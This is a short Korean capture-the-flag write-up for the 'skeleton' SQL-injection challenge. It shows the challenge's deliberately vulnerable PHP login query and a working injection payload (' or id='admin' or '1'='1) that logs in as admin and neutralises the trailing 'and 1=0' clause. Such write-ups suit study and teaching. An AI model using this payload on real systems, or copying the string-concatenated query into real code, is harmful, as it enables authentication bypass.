# Skeleton

소스코드는 다음과 같다.

```php
<?php 
  include "./config.php"; 
  login_chk(); 
  $db = dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_skeleton where id='guest' and pw='{$_GET[pw]}' and 1=0"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysqli_fetch_array(mysqli_query($db,$query)); 
  if($result['id'] == 'admin') solve("skeleton"); 
  highlight_file(__FILE__); 
?>
```

조건문 뒤에 `and 1=0`이라는 구문이 있으니 무조건 쿼리가 안찾아질 것 이다.
따라서 `and 1=0`을 무효화시키고, `id`를 `admin`으로 넣어줘야한다.
`and`로 이어져있는 구문사이에 `or`로 새로운 구문을 넣어주자

> ?pw=' or id='admin' or '1'='1

이렇게 하면 이런 결과가 나오게 된다.

> select id from prob_skeleton where id='guest' and pw='' or id='admin' or '1'='1' and 1=0

클리어!
